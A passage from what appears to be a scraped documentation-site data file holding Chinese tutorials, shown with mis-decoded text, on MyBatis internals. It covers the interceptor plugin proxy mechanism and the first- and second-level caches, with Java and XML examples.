åå¾ç­¾åmap\n        map<class<?>, set<method>> signaturemap = getsignaturemap(interceptor);\n        // åå¾è¦æ¹åè¡ä¸ºçç±»(parameterhandler|resultsethandler|statementhandler|executor)\n        class<?> type = target.getclass();\n        // åå¾æ¥å£\n        class<?>[] interfaces = getallinterfaces(type, signaturemap);\n        // åå»ºä»£ç(statementhandler)\n        if (interfaces.length > 0) {\n            // ä»£ç\n            return proxy.newproxyinstance(\n                    type.getclassloader(),\n                    interfaces,\n                    new plugin(target, interceptor, signaturemap));\n        }\n        return target;\n    }\n    /**\n     * è·åæ¹æ³ç­¾åç» map\n     */\n    private static map<class<?>, set<method>> getsignaturemap(interceptor interceptor) {\n        // å intercepts æ³¨è§£\n        intercepts interceptsannotation = interceptor.getclass().getannotation(intercepts.class);\n        // å¿é¡»å¾æ intercepts æ³¨è§£ï¼æ²¡ææ¥é\n        if (interceptsannotation == null) {\n            throw new runtimeexception("no @intercepts annotation was found in interceptor " + interceptor.getclass().getname());\n        }\n        // valueæ¯æ°ç»åï¼signatureçæ°ç»\n        signature[] sigs = interceptsannotation.value();\n        // æ¯ä¸ª class ç±»æå¤ä¸ªå¯è½æå¤ä¸ª method éè¦è¢«æ¦æª\n        map<class<?>, set<method>> signaturemap = new hashmap<>();\n        for (signature sig : sigs) {\n            set<method> methods = signaturemap.computeifabsent(sig.type(), k -> new hashset<>());\n            try {\n                // ä¾å¦è·åå°æ¹æ³ï¼statementhandler.prepare(connection connection)ãstatementhandler.parameterize(statement statement)...\n                method method = sig.type().getmethod(sig.method(), sig.args());\n                methods.add(method);\n            } catch (nosuchmethodexception e) {\n                throw new runtimeexception("could not find method on " + sig.type() + " named " + sig.method() + ". cause: " + e, e);\n            }\n        }\n        return signaturemap;\n    }\n    /**\n     * åå¾æ¥å£\n     */\n    private static class<?>[] getallinterfaces(class<?> type, map<class<?>, set<method>> signaturemap) {\n        set<class<?>> interfaces = new hashset<class<?>>();\n        while (type != null) {\n            for (class<?> c : type.getinterfaces()) {\n                // æ¦æª parameterhandler|resultsethandler|statementhandler|executor\n                if (signaturemap.containskey(c)) {\n                    interfaces.add(c);\n                }\n            }\n            type = type.getsuperclass();\n        }\n        return interfaces.toarray(new class<?>[interfaces.size()]);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\n\n# èªå®ä¹\n\npackage cn.mybatis.test.plugin;\n\nimport cn.mybatis.executor.statement.statementhandler;\nimport cn.mybatis.mapping.boundsql;\nimport cn..mybatis.plugin.interceptor;\nimport cn.mybatis.plugin.intercepts;\nimport cn.mybatis.plugin.invocation;\nimport cn.mybatis.plugin.signature;\n\nimport java.sql.connection;\nimport java.util.properties;\n\n@intercepts({@signature(type = statementhandler.class, method = "prepare", args = {connection.class})})\npublic class testplugin implements interceptor {\n\n    @override\n    public object intercept(invocation invocation) throws throwable {\n        // è·åstatementhandler\n        statementhandler statementhandler = (statementhandler) invocation.gettarget();\n        // è·åsqlä¿¡æ¯\n        boundsql boundsql = statementhandler.getboundsql();\n        string sql = boundsql.getsql();\n        // è¾åºsql\n        system.out.println("æ¦æªsqlï¼" + sql);\n        // æ¾è¡\n        return invocation.proceed();\n    }\n\n    @override\n    public void setproperties(properties properties) {\n        system.out.println("åæ°è¾åºï¼" + properties.getproperty("test00"));\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n',charsets:{cjk:!0}},{title:"æ ¸å¿åè½æè§£ ä¸äºçº§ç¼å­åç",frontmatter:{title:"æ ¸å¿åè½æè§£ ä¸äºçº§ç¼å­åç",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/302/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/02.Mybatis/31.mybatis/302.%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%8B%86%E8%A7%A3%20%E4%B8%80%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8E%9F%E7%90%86.html",relativePath:"01.æ¡æ¶/02.Mybatis/31.mybatis/302.æ ¸å¿åè½æè§£ ä¸äºçº§ç¼å­åç.md",key:"v-f97f0090",path:"/mybatis/mybatis/302/",headers:[{level:2,title:"ä¸çº§ç¼å­",slug:"ä¸çº§ç¼å­",normalizedTitle:"ä¸çº§ç¼å­",charIndex:13},{level:3,title:"è§£æ",slug:"è§£æ",normalizedTitle:"è§£æ",charIndex:292},{level:3,title:"åå¤",slug:"åå¤",normalizedTitle:"åå¤",charIndex:1214},{level:3,title:"æ§è¡",slug:"æ§è¡",normalizedTitle:"æ§è¡",charIndex:1245},{level:2,title:"äºçº§ç¼å­",slug:"äºçº§ç¼å­",normalizedTitle:"äºçº§ç¼å­",charIndex:18},{level:3,title:"è§£æ",slug:"è§£æ-2",normalizedTitle:"è§£æ",charIndex:292},{level:2,title:"åå¤",slug:"åå¤-2",normalizedTitle:"åå¤",charIndex:1214},{level:2,title:"æ§è¡",slug:"æ§è¡-2",normalizedTitle:"æ§è¡",charIndex:1245}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ä¸çº§ç¼å­ è§£æ åå¤ æ§è¡ äºçº§ç¼å­ è§£æ åå¤ æ§è¡",content:'MyBatis çç¼å­åä¸ºä¸çº§ç¼å­åäºçº§ç¼å­ï¼ç¼å­æåµå¦ä¸å¾ï¼åæå¡æ¶æä¸­ï¼æä¸ä»æåªæä¸ä¸ªç¨åºæä¾ç¸åæå¡ï¼ï¼ä¸çº§ç¼å­å¼å¯ä¸ä¼å½±åä¸å¡ï¼åªä¼æé«æ§è½ã å¾®æå¡æ¶æä¸­éè¦å³é­ä¸çº§ç¼å­ï¼åå ï¼Service1 åæ¥è¯¢æ°æ®ï¼è¥ä¹å Service2 ä¿®æ¹äºæ°æ®ï¼ä¹å Service1 ååæ¬¡ä»¥åæ ·çæ¥è¯¢æ¡ä»¶æ¥è¯¢æ°æ®ï¼å èµ°ç¼å­ä¼åºç°æ¥å¤çæ°æ®ä¸æ¯ææ°æ°æ®\n\n\n\n\n# ä¸çº§ç¼å­\n\nä¸çº§ç¼å­æ¯åºäº SQLSession çº§å«çï¼å¨åä¸ä¸ª Session çç¸åæ¥è¯¢è¯­å¥ä¼æä¼ä»ç¼å­ä¸­æ¥è¯¢ï¼æè°ç¸ååæ¬ SQL ç¸åï¼æ¡ä»¶ç¸åç­ï¼é£ä¹æä»¬çä¸å¨æºç ä¸­å·ä½æ¯æä¹ç»´æ¤åä½¿ç¨è¿ä¸ªç¼å­çã\n\n\n# è§£æ\n\næè¿°ä¸çº§ç¼å­åªéè¦å¨ <configuration> æ ç­¾ä¸­æè¿°å³å¯ï¼èä¸çº§ç¼å­ç value å¼æ SESSION å STATEMENT ä¸¤ç§ï¼å¦æè®¾ç½®ä¸º STATEMENT å³é­ä¸çº§ç¼å­ï¼ä¸çº§ç¼å­æ¯ MyBatis æä¾çé»è®¤ç¼å­\n\n<configuration>\n    <settings>\n        \x3c!--ç¼å­çº§å«ï¼SESSION/STATEMENT--\x3e\n        <setting name="localCacheScope" value="SESSION"/>\n    </settings>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n\n\nè§£ææ ¸å¿ä»£ç ä¼å¾å° localCacheScopeçå¼ ï¼ç»´æ¤å° configuration å¨å±éç½®ä¸­\n\nprivate void settingsElement(Element context) {\n    if (context == null) return;\n    List<Element> elements = context.elements();\n    Properties props = new Properties();\n    for (Element element : elements) {\n        props.setProperty(element.attributeValue("name"), element.attributeValue("value"));\n    }\n    // æ¯å¦å¯ç¨äºçº§ç¼å­\n    configuration.setCacheEnabled(booleanValueOf(props.getProperty("cacheEnabled"), true));\n    // ä¸çº§ç¼å­çéç½®\n    configuration.setLocalCacheScope(LocalCacheScope.valueOf(props.getProperty("localCacheScope")));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# åå¤\n\nåå¤é¶æ®µä¸»è¦æ¯å¨ openSession æ¹æ³ï¼ä»ä¼å¨æ§è¡å¨éé¢å»ç´æ¥ new PerpetualCache æ°¸ä¹ç¼å­ï¼æ§è¡å¨å°±æ¥æäºè¿ä¸ªç¼å­å¯¹è±¡\n\n// æå¼ä¸ä¸ª session\n@Override\npublic SqlSession openSession() {\n    Transaction tx = null;\n    try {\n        final Environment environment = configuration.getEnvironment();\n        TransactionFactory transactionFactory = environment.getTransactionFactory();\n        tx = transactionFactory.newTransaction(configuration.getEnvironment().getDataSource(), TransactionIsolationLevel.READ_COMMITTED, false);\n        // åå»ºæ§è¡å¨\n        final Executor executor = configuration.newExecutor(tx);\n        // åå»ºDefaultSqlSession\n        return new DefaultSqlSession(configuration, executor);\n    } catch (Exception e) {\n        try {\n            assert tx != null;\n            tx.close();\n        } catch (SQLException ignore) {\n        }\n        throw new RuntimeException("Error opening session.  Cause: " + e);\n    }\n}\n\n// åå»ºæ§è¡å¨\npublic Executor newExecutor(Transaction transaction) {\n    Executor executor = new SimpleExecutor(this, transaction);\n    // éç½®å¼å¯äºçº§ç¼å­ï¼åå»º CachingExecutor(é»è®¤å°±æ¯æç¼å­)è£é¥°èæ¨¡å¼ï¼\n    if (cacheEnabled) {\n        executor = new CachingExecutor(executor);\n    }\n    return executor;\n}\n\n// SimpleExecutor ç®åæ§è¡å¨çæé æ¹æ³\npublic class SimpleExecutor extends BaseExecutor {\n    public SimpleExecutor(Configuration configuration, Transaction transaction) {\n        super(configuration, transaction);\n    }\n}\n\n// åºç¡æ§è¡å¨çæé æ¹æ³\nprotected BaseExecutor(Configuration configuration, Transaction transaction) {\n    this.configuration = configuration;\n    this.transaction = transaction;\n    this.wrapper = this;\n    // new ä¸ä¸ªæ°¸ä¹ç¼å­\n    this.localCache = new PerpetualCache("LocalCache");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\nPerpetualCache ç»§æ¿äº Cache ï¼å¹¶å®ç°äºåºæ¬çå¯¹ç¼å­çæä½\n\npublic class PerpetualCache implements Cache {\n    private String id;\n    // ä½¿ç¨HashMapå­æ¾ä¸çº§ç¼å­æ°æ®ï¼session çå½å¨æè¾ç­ï¼æ­£å¸¸æåµä¸æ°æ®ä¸ä¼ä¸ç´å¨ç¼å­å­æ¾\n    private Map<Object, Object> cache = new HashMap<>();\n    public PerpetualCache(String id) {\n        this.id = id;\n    }\n    @Override\n    public String getId() {\n        return id;\n    }\n    @Override\n    public void putObject(Object key, Object value) {\n        cache.put(key, value);\n    }\n    @Override\n    public Object getObject(Object key) {\n        return cache.get(key);\n    }\n    @Override\n    public Object removeObject(Object key) {\n        return cache.remove(key);\n    }\n    @Override\n    public void clear() {\n        cache.clear();\n    }\n    @Override\n    public int getSize() {\n        return cache.size();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# æ§è¡\n\nå¨åå¤é¶æ®µå·²ç»å¾å°äºæ§è¡å¨ï¼å¹¶å¨æ§è¡å¨éé¢å¾å°äº PerpetualCache ç¼å­ï¼åªéè¦ç¥éå®¢æ·ä½¿ç¨çæ¯æ¥è¯¢è¿æ¯ä¿®æ¹ç­æä½åï¼æ§è¡æ§è¡å¨éé¢å¯¹åºç query or update æ¹æ³å³å¯ï¼æ ¸å¿ç query\n\npublic abstract class BaseExecutor implements Executor {\n\n    private org.slf4j.Logger logger = LoggerFactory.getLogger(BaseExecutor.class);\n\n    protected Configuration configuration;\n    protected Transaction transaction;\n    protected Executor wrapper;\n\n    // æ¬å°ç¼å­\n    protected PerpetualCache localCache;\n\n    private boolean closed;\n    // æ¥è¯¢å æ \n    protected int queryStack = 0;\n\n    protected BaseExecutor(Configuration configuration, Transaction transaction) {\n        this.configuration = configuration;\n        this.transaction = transaction;\n        this.wrapper = this;\n        this.localCache = new PerpetualCache("LocalCache");\n    }\n\n    @Override\n    public int update(MappedStatement ms, Object parameter) throws SQLException {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        clearLocalCache();\n        return doUpdate(ms, parameter);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler) throws SQLException {\n        // 1. è·åç»å®SQL\n        BoundSql boundSql = ms.getBoundSql(parameter);\n        // 2. åå»ºç¼å­Key\n        CacheKey key = createCacheKey(ms, parameter, rowBounds, boundSql);\n        return query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        // æ¸çå±é¨ç¼å­ï¼æ¥è¯¢å æ ä¸º0åæ¸çãqueryStack é¿åéå½è°ç¨æ¸ç\n        if (queryStack == 0 && ms.isFlushCacheRequired()) {\n            clearLocalCache();\n        }\n        List<E> list;\n        try {\n            queryStack++;\n            // æ ¹æ®cacheKeyä»localCacheä¸­æ¥è¯¢æ°æ®\n            list = resultHandler == null ? (List<E>) localCache.getObject(key) : null;\n            if (list == null) {\n                list = queryFromDatabase(ms, parameter, rowBounds, resultHandler, key, boundSql);\n            }\n        } finally {\n            queryStack--;\n        }\n        if (queryStack == 0) {\n            // å¦æä¸æ¯ SESSION æ¨¡å¼ï¼åæ¸é¤ç¼å­\n            if (configuration.getLocalCacheScope() == LocalCacheScope.STATEMENT) {\n                clearLocalCache();\n            }\n        }\n        return list;\n    }\n\n    private <E> List<E> queryFromDatabase(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException {\n        List<E> list;\n        localCache.putObject(key, ExecutionPlaceholder.EXECUTION_PLACEHOLDER);\n        try {\n            list = doQuery(ms, parameter, rowBounds, resultHandler, boundSql);\n        } finally {\n            localCache.removeObject(key);\n        }\n        // å­å¥ç¼å­\n        localCache.putObject(key, list);\n        return list;\n    }\n\n    protected abstract int doUpdate(MappedStatement ms, Object parameter) throws SQLException;\n\n    protected abstract <E> List<E> doQuery(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql) throws SQLException;\n\n    @Override\n    public Transaction getTransaction() {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        return transaction;\n    }\n\n    @Override\n    public void commit(boolean required) throws SQLException {\n        if (closed) {\n            throw new RuntimeException("Cannot commit, transaction is already closed");\n        }\n        clearLocalCache();\n        if (required) {\n            transaction.commit();\n        }\n    }\n\n    @Override\n    public void rollback(boolean required) throws SQLException {\n        if (!closed) {\n            try {\n                clearLocalCache();\n            } finally {\n                if (required) {\n                    transaction.rollback();\n                }\n            }\n        }\n    }\n\n    @Override\n    public void clearLocalCache() {\n        if (!closed) {\n            localCache.clear();\n        }\n    }\n\n    @Override\n    public CacheKey createCacheKey(MappedStatement ms, Object parameterObject, RowBounds rowBounds, BoundSql boundSql) {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        CacheKey cacheKey = new CacheKey();\n        cacheKey.update(ms.getId());\n        cacheKey.update(rowBounds.getOffset());\n        cacheKey.update(rowBounds.getLimit());\n        cacheKey.update(boundSql.getSql());\n        List<ParameterMapping> parameterMappings = boundSql.getParameterMappings();\n        TypeHandlerRegistry typeHandlerRegistry = ms.getConfiguration().getTypeHandlerRegistry();\n        for (ParameterMapping parameterMapping : parameterMappings) {\n            Object value;\n            String propertyName = parameterMapping.getProperty();\n            if (boundSql.hasAdditionalParameter(propertyName)) {\n                value = boundSql.getAdditionalParameter(propertyName);\n            } else if (parameterObject == null) {\n                value = null;\n            } else if (typeHandlerRegistry.hasTypeHandler(parameterObject.getClass())) {\n                value = parameterObject;\n            } else {\n                MetaObject metaObject = configuration.newMetaObject(parameterObject);\n                value = metaObject.getValue(propertyName);\n            }\n            cacheKey.update(value);\n        }\n        if (configuration.getEnvironment() != null) {\n            cacheKey.update(configuration.getEnvironment().getId());\n        }\n        return cacheKey;\n    }\n\n    @Override\n    public void setExecutorWrapper(Executor executor) {\n        this.wrapper = wrapper;\n    }\n\n    @Override\n    public void close(boolean forceRollback) {\n        try {\n            try {\n                rollback(forceRollback);\n            } finally {\n                transaction.close();\n            }\n        } catch (SQLException e) {\n            logger.warn("Unexpected exception on closing transaction.  Cause: " + e);\n        } finally {\n            transaction = null;\n            localCache = null;\n            closed = true;\n        }\n    }\n\n    protected void closeStatement(Statement statement) {\n        if (statement != null) {\n            try {\n                statement.close();\n            } catch (SQLException ignore) {\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n\n\nå¯ä»¥çå° æ§è¡å¨éé¢ç»´æ¤äº query update commit ç­æ¹æ³ï¼å¨æ§è¡æ¥è¯¢çæ¶åä¼åçæ CacheKey ï¼ä¼æç§ namespace.id + åé¡µoffset + åé¡µlimit + æ§è¡çSQLè¯­å¥ + æ¥è¯¢æ¡ä»¶çå¼ + ç¯å¢ID çæå¯ä¸ç keyï¼ç¶ååä¸ºæ¥è¯¢ç¼å­ç keyï¼æ¥è¯¢ç»æåä¸º valueï¼å¦æåä¸å SQLSession æ§è¡ç¸åè¯­å¥åæ¡ä»¶ä»¥ååé¡µç­ï¼å°±ä¼ä»ç¼å­ä¸­å½ä¸­å¹¶è¿åç»æãç¼å­çæ¸é¤ï¼å°±æ¯å½è¯¥ SQLSession æ§è¡ updateï¼commitï¼closeï¼rollback æ¶è¯¥ SQLSession å°±æ¸é¤ç¼å­ã\n\nå¨ SQL è¯­å¥ä¸­ä¹å¯ä»¥è®¾ç½®æ¸é¤ç¼å­ï¼åªéè¦å¨ <select>ã<insert> å <update> ç­ SQL æ ç­¾ä¸­è®¾ç½® flushCache="true" å±æ§ä¼å¼ºå¶æ¸ç©ºæ¬å°ç¼å­ï¼ä½¿å¾ä¸æ¬¡æ¥è¯¢æ¶éæ°ä»æ°æ®åºä¸­è·åæ°æ®ãéç¨äºä¸çº§ç¼å­åäºçº§ç¼å­\n\n<select id="selectById" resultType="com.example.User" flushCache="true">\n  select * from user where id = #{id}\n</select>\n\n\n1\n2\n3\n\n\nè¿æå°±æ¯å¨ query æ¥è¯¢ä¸­ï¼å½å¦æä½ è®¾ç½® LocalCacheScope = STATEMENT æ¶ï¼å¨ query ä¹ä¼èªå¨æ¸é¤ç¼å­ï¼ä¹å°±æ¯æä»¬æè¯´çå³é­ä¸çº§ç¼å­çæ¹æ³\n\n\n# äºçº§ç¼å­\n\näºçº§ç¼å­æ¯ä¸º Namespace ä¹å« mapper çº§å«çç¼å­ï¼æ¯è·¨ SQLSession çï¼ä»ä¼å¨åæçæ§è¡å¨ä¸å°è£ä¸ä¸ª CachingExecutor ï¼æ¥ç®¡çç¼å­ï¼ CachingExecutor ä½¿ç¨äºè£é¥°å¨æ¨¡å¼æ¥è£é¥°åºç¡ç Executor æ§è¡å¨ã\n\n\n# è§£æ\n\nå¨äºçº§ç¼å­ä¸­çéç½®æ¹å¼å·ä½å¦ä¸\n\n\x3c!-- å¿é¡»åå¼å¯ç¼å­ --\x3e\n<configuration>\n    <settings>\n        \x3c!--  true/false äºçº§ç¼å­æ¯å¦ä½¿ç¨ --\x3e\n        <setting name="cacheEnabled" value="true"/>\n    </settings>\n</configuration>\n\n\x3c!-- æå®å¨æä¸ªmapperä¸­ä½¿ç¨ --\x3e\n<mapper namespace="com.example.MyMapper">\n    \x3c!-- è®¾ç½®è¯¥mapperçäºçº§ç¼å­ --\x3e\n    <cache eviction="LRU" flushInterval="100000" readOnly="true" size="1024"/>\n    \x3c!-- useCacheï¼è¡¨ç¤ºæ¯å¦ä½¿ç¨äºçº§ç¼å­ï¼å¦æè®¾ç½®ä¸º trueï¼åä¼ä½¿ç¨äºçº§ç¼å­ãå¯¹äº select åç´ ï¼é»è®¤å¼ä¸º trueã --\x3e\n    \x3c!-- useCache å±æ§åªè½æ§å¶æ¯å¦ä½¿ç¨äºçº§ç¼å­ï¼å®ä¸è½å³é­ä¸çº§ç¼å­ãä¸çº§ç¼å­æ¯ MyBatis çé»è®¤è¡ä¸ºï¼å®æ»æ¯å¼å¯çï¼æ æ³å³é­ã --\x3e\n    <select id="queryActivityById" parameterType="cn.bugstack.mybatis.test.po.Activity" flushCache="false" useCache="true">\n        SELECT activity_id, activity_name, activity_desc, create_time, update_time\n        FROM activity\n        <trim prefix="where" prefixOverrides="AND | OR" suffixOverrides="and">\n            <if test="null != activityId">\n                activity_id = #{activityId}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¶ä¸­ <cache > æ ç­¾æå¤ä¸ªå±æ§ï¼è¿éä¸ä¸ä»ç»ä¸ä¸ï¼\n\n * typeï¼å¯ä»¥æå®èªå®ä¹ç¼å­ï¼ä½æ¯è¯¥ç±»å¿é¡»å®ç°ï¼èä¸æ¯å¨ç±»å\n * evictionï¼ç¼å­åæ¶ç­ç¥ï¼é»è®¤ä¸º LRUï¼Least Recently Usedï¼ï¼ç­ç¥ä»ç»å¦ä¸ï¼\n   LRUï¼æç§è®¿é®æ¶é´æåºï¼æè¿æªä½¿ç¨çæ°æ®ä¼åæ¸é¤ã\n   FIFOï¼æç§æå¥æ¶é´æåºï¼åæå¥çæ°æ®åæ¸é¤ã\n   SOFTï¼åºäºåå¾åæ¶ç®æ³ï¼å½ç³»ç»åå­ä¸è¶³æ¶ï¼ä¼ä¼åæ¸çä¸å¸¸ç¨çãå ç¨åå­è¾å¤çæ°æ®ã\n   WEAKï¼å¼±å¼ç¨æºå¶ï¼å½ JVM è¿è¡åå¾åæ¶æ¶ï¼å¦æå¤æ­ä¸ä¸ªå¯¹è±¡åªè¢«å¼±å¼ç¨æåï¼åä¼å°å¶åæ¶ã\n * flushIntervalï¼å·æ°é´éæ¶é´ï¼è¡¨ç¤ºå¤é¿æ¶é´å·æ°ä¸æ¬¡ç¼å­ï¼åä½ä¸ºæ¯«ç§ï¼é»è®¤ä¸å·æ°ã\n * sizeï¼ç¼å­çå¤§å°ï¼è¡¨ç¤ºæå¤å¯ä»¥ç¼å­å¤å°ä¸ªå¯¹è±¡ã\n * readOnlyï¼æ¯å¦åªè¯»ï¼é»è®¤ä¸º falseï¼è¡¨ç¤ºå¯ç¨ç¼å­æ´æ°æºå¶ã\n * blockingï¼æ¯å¦å¯ç¨é»å¡ï¼é»è®¤ä¸º falseï¼è¡¨ç¤ºä¸å¯ç¨ã\n\n> flushInterval é»è®¤æåµä¸ï¼MyBatis éç¨åºäº PerpetualCache (æ°¸ä¹ç¼å­) çç¼å­å®ç°æ¹å¼ï¼å³ç¼å­ä¼ä¸ç´ä¿å­å¨åå­ä¸­ï¼ç´å°ä¼è¯å³é­æ¶æè¢«æ¸é¤ãèå½æä»¬ä½¿ç¨åºäº Ehcache çç¼å­å®ç°æ¶ï¼å¯ä»¥éè¿è®¾ç½® flushInterval å±æ§æ§å¶ç¼å­çå·æ°æ¶é´ï¼å³å®æ¶å°ç¼å­ä¸­çæ°æ®åå¥å°ç£çææä¹åå­å¨ä¸­ï¼ä»¥é¿åç¼å­è¿æãå¤±ææåå­æº¢åºç­é®é¢ã\n\nå½ Mybaits å¯å¨åä¼è¯»å°äºçº§ç¼å­çéç½®ï¼åä¼è¿è¡ <cache> åºç¡çè§£æï¼å¾å° XML éé¢çå±æ§å¼ï¼å¶æ¬¡ç¨å¼ä¿¡æ¯ç»æä¸ä¸ª Cache å¯¹è±¡ï¼å¹¶æè¿ä¸ª Cache å¯¹è±¡ç»´æ¤å°å¨å±éç½® Configuration ä¸­ï¼è¯¥å¨å±éç½®éé¢æ¯ç»´æ¤ä¸ä¸ª Map ç»æçå®¹å¨\n\n// å¼å§è§£æ\nprivate void cacheElement(Element context) {\n    if (context == null) return;\n    // åºç¡éç½®ä¿¡æ¯ï¼é»è®¤æ¯æ°¸æç¼å­\n    String type = context.attributeValue("type", "PERPETUAL");\n    Class<? extends Cache> typeClass = typeAliasRegistry.resolveAlias(type);\n    // ç¼å­éå FIFO\n    String eviction = context.attributeValue("eviction", "FIFO");\n    Class<? extends Cache> evictionClass = typeAliasRegistry.resolveAlias(eviction);\n    Long flushInterval = Long.valueOf(context.attributeValue("flushInterval"));\n    Integer size = Integer.valueOf(context.attributeValue("size"));\n    boolean readWrite = !Boolean.parseBoolean(context.attributeValue("readOnly", "false"));\n    boolean blocking = !Boolean.parseBoolean(context.attributeValue("blocking", "false"));\n\n    // è§£æé¢å¤å±æ§ä¿¡æ¯ï¼<property name="cacheFile" value="/tmp/xxx-cache.tmp"/>\n    List<Element> elements = context.elements();\n    Properties props = new Properties();\n    for (Element element : elements) {\n        props.setProperty(element.attributeValue("name"), element.attributeValue("value"));\n    }\n    // æå»ºç¼å­\n    builderAssistant.useNewCache(typeClass, evictionClass, flushInterval, size, readWrite, blocking, props);\n}\n\n// æå»ºCache\npublic Cache useNewCache(Class<? extends Cache> typeClass,\n                        Class<? extends Cache> evictionClass,\n                        Long flushInterval,\n                        Integer size,\n                        boolean readWrite,\n                        boolean blocking,\n                        Properties props) {\n    // å¤æ­ä¸ºnullï¼åç¨é»è®¤å¼\n    typeClass = valueOrDefault(typeClass, PerpetualCache.class);\n    evictionClass = valueOrDefault(evictionClass, FifoCache.class);\n\n    // å»ºé èæ¨¡å¼æå»º Cache [currentNamespace=cn.bugstack.mybatis.test.dao.IActivityDao]\n    Cache cache = new CacheBuilder(currentNamespace)\n            .implementation(typeClass)\n            .addDecorator(evictionClass)\n            .clearInterval(flushInterval)\n            .size(size)\n            .readWrite(readWrite)\n            .blocking(blocking)\n            .properties(props)\n            .build();\n\n    // æ·»å ç¼å­\n    configuration.addCache(cache);\n    // ç»èªå·±ç»´æ¤ä¸ä¸ª cache ä»¥ä¾¿åç»­ MappedStatement ç¨å°\n    currentCache = cache;\n    return cache;\n}\n\n// æ·»å å° configurationå¨å±éç½®ç»´æ¤ç cachesä¸­\npublic class Configuration {\n    // ç¼å­,å­å¨Mapé\n    protected final Map<String, Cache> caches = new HashMap<>();\n    public void addCache(Cache cache) {\n        caches.put(cache.getId(), cache);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\nç¼å­è§£æè¿äºï¼ä½æ¯æä¸»è¦çè¿æ¯ <select> æ ç­¾çä¸äºï¼æ ç­¾ä¸é¢æè¿°äºå·ä½çç¼å­æ¯å¦ä½¿ç¨ï¼ç¼å­æ¯å¦æ¸é¤ï¼æä»¥è¿éè¦è§£ææ ç­¾ä¸çç¼å­ä¿¡æ¯ï¼ä¸»è¦æ¯ flushCache å useCache è¿ä¸¤ä¸ªå±æ§\n\n// è§£ææä½\npublic void parseStatementNode() {\n    String id = element.attributeValue("id");\n    // åæ°ç±»å\n    String parameterType = element.attributeValue("parameterType");\n    Class<?> parameterTypeClass = resolveAlias(parameterType);\n    // å¤é¨åºç¨ resultMap\n    String resultMap = element.attributeValue("resultMap");\n    // ç»æç±»å\n    String resultType = element.attributeValue("resultType");\n    Class<?> resultTypeClass = resolveAlias(resultType);\n    // è·åå½ä»¤ç±»å(select|insert|update|delete)\n    String nodeName = element.getName();\n    SqlCommandType sqlCommandType = 